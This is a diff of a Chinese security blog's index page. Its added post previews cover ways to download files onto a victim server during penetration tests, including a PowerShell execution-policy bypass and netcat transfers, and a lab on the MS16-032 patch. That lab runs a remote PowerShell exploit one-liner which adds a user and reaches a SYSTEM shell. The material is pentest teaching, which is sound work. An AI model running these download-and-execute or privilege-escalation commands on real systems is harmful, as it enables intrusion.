@@ -134,6 +134,80 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-攻防世界 — Web进阶题（11-20）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/10/27/攻防世界 — Web进阶题（11-20）/">攻防世界 — Web进阶题(第11-20关)</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/10/27/攻防世界 — Web进阶题（11-20）/" class="archive-article-date">
+  	<time datetime="2019-10-26T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>进入题目后给</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/10/27/攻防世界 — Web进阶题（11-20）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-CVE-2016-5159 复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -499,6 +573,262 @@
 
 
   
+    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
+<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
+<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
+<p>如果Powershell禁止执行了，使用如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;powershell <span class="built_in">set</span>-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
+<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
+<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
+<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; executionpolicy</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">"http://domain/file"</span></span><br><span class="line">dim xHttp: Set xHttp = createobject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">dim bStrm: Set bStrm = createobject(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">xHttp.Open <span class="string">"GET"</span>, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .<span class="built_in">type</span> = 1 <span class="string">'</span></span><br><span class="line"><span class="string">    .open</span></span><br><span class="line"><span class="string">    .write xHttp.responseBody</span></span><br><span class="line"><span class="string">    .savetofile " C:\%homepath%\file", 2 '</span></span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(<span class="string">"http://domain/file"</span>, <span class="string">"file"</span>);</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># perl test.pl</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://domain/file'</span>) </span><br><span class="line">localFile = open(<span class="string">'local_file'</span>, <span class="string">'w'</span>) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python test.py</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line">require <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"www.domain.com"</span>) &#123; |http|</span><br><span class="line">r = http.get(<span class="string">"/file"</span>)</span><br><span class="line">open(<span class="string">"save_location"</span>, <span class="string">"wb"</span>) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ruby test.rb</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php </span></span><br><span class="line"><span class="string">"http://example.com/file"</span>);</span><br><span class="line"><span class="variable">$lf</span> = <span class="string">"local_file"</span>;         </span><br><span class="line"><span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">'w'</span>);         </span><br><span class="line">fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[0]);         </span><br><span class="line">fclose(<span class="variable">$fh</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># php test.php</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
+<p>复制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
+<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
+<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
+<p>target执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
+<p><strong>Netcat补充</strong>：</p>
+<p><code>传输文件</code></p>
+<p>方法一：</p>
+<p>接收端，先监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p>传送端，发送</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>方法二：</p>
+<p>发送端，先监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>接收端，连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p><code>传送目录</code></p>
+<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
+<p>接收端，先监听并准备解压缩</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
+<p>发送端，压缩并发送</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
+<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
+<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
+<li><ol>
+<li>打开记事本</li>
+</ol>
+</li>
+<li><ol>
+<li>文件，打开</li>
+</ol>
+</li>
+<li><ol>
+<li>在文件名处填入下载地址</li>
+</ol>
+</li>
+</ul>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Windows系统添加补丁" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p># </p>
+<h1 id="补丁下载"><a href="#补丁下载" class="headerlink" title="补丁下载"></a>补丁下载</h1><p>各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到<code>Microsoft</code>的官网去查看和下载：<a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
+<p>点击左边栏的<code>Security Bulletins</code>可以查找想要看的漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-1.png" alt="1"></p>
+<p>这里以打<code>MS16-032（CVE-2016-0099）</code>的补丁为例：左边栏找到<code>MS16-032</code>，找到系统对应版本</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-2.png" alt="2"></p>
+<p>在跳转页面后，点击<code>Download</code>，下载</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-3.png" alt="3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-4.png" alt="4"></p>
+<h1 id="补丁安装"><a href="#补丁安装" class="headerlink" title="补丁安装"></a>补丁安装</h1><p>Windows系统自带补丁安装程序：<code>wusa</code>。命令行执行<code>wusa.exe</code>可以弹出使用帮助</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-5.png" alt="5"></p>
+<p>命令行安装补丁（要制定完整的文件地址，不能是相对地址）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;wusa E:\MS16-032\Windows6.1-KB3139914-x64.msu</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-6.png" alt="6"></p>
+<p>补丁安装完成需要<code>重启计算机才能生效</code>。重启完之后，看一下补丁的安装情况。可以看到<code>KB3139914</code>已经安装了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;systeminfo</span><br><span class="line">...</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">修补程序:         安装了 5 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB2999226</span><br><span class="line">                  [03]: KB3139914</span><br><span class="line">                  [04]: KB958488</span><br><span class="line">                  [05]: KB976902</span><br><span class="line">...</span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>当前系统存在的用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;net user</span><br><span class="line"></span><br><span class="line">\\WIN... 的用户帐户</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<p>执行<code>MS16-032（CVE-2016-0099）</code>的脚本，可以参考之前这篇文章：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[!] No valid thread handles were captured, exiting!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>从结果可以看出，已经无法成功执行，说明我们打的补丁已经生效了</p>
+<h1 id="补丁卸载"><a href="#补丁卸载" class="headerlink" title="补丁卸载"></a>补丁卸载</h1><p>命令行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;wusa /uninstall /kb:3139914</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-7.png" alt="7"></p>
+<p>卸载完成之后需要重启。重启后我们再次查看补丁列表，已经没有了<code>KB3139914</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;systeminfo</span><br><span class="line">...</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">修补程序:         安装了 5 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB2999226</span><br><span class="line">                  [03]: KB958488</span><br><span class="line">                  [04]: KB976902</span><br><span class="line">...</span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>试一下执行<code>MS16-032（CVE-2016-0099）</code>的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user</span><br><span class="line"></span><br><span class="line">\\WIN... 的用户帐户</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>脚本又能执行成功了，说明我们成功卸载补丁</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Linux 提权常用命令集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -639,262 +969,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/Linux 提权常用命令集/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Windows系统添加补丁" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p># </p>
-<h1 id="补丁下载"><a href="#补丁下载" class="headerlink" title="补丁下载"></a>补丁下载</h1><p>各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到<code>Microsoft</code>的官网去查看和下载：<a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
-<p>点击左边栏的<code>Security Bulletins</code>可以查找想要看的漏洞</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-1.png" alt="1"></p>
-<p>这里以打<code>MS16-032（CVE-2016-0099）</code>的补丁为例：左边栏找到<code>MS16-032</code>，找到系统对应版本</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-2.png" alt="2"></p>
-<p>在跳转页面后，点击<code>Download</code>，下载</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-3.png" alt="3"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-4.png" alt="4"></p>
-<h1 id="补丁安装"><a href="#补丁安装" class="headerlink" title="补丁安装"></a>补丁安装</h1><p>Windows系统自带补丁安装程序：<code>wusa</code>。命令行执行<code>wusa.exe</code>可以弹出使用帮助</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-5.png" alt="5"></p>
-<p>命令行安装补丁（要制定完整的文件地址，不能是相对地址）</p>
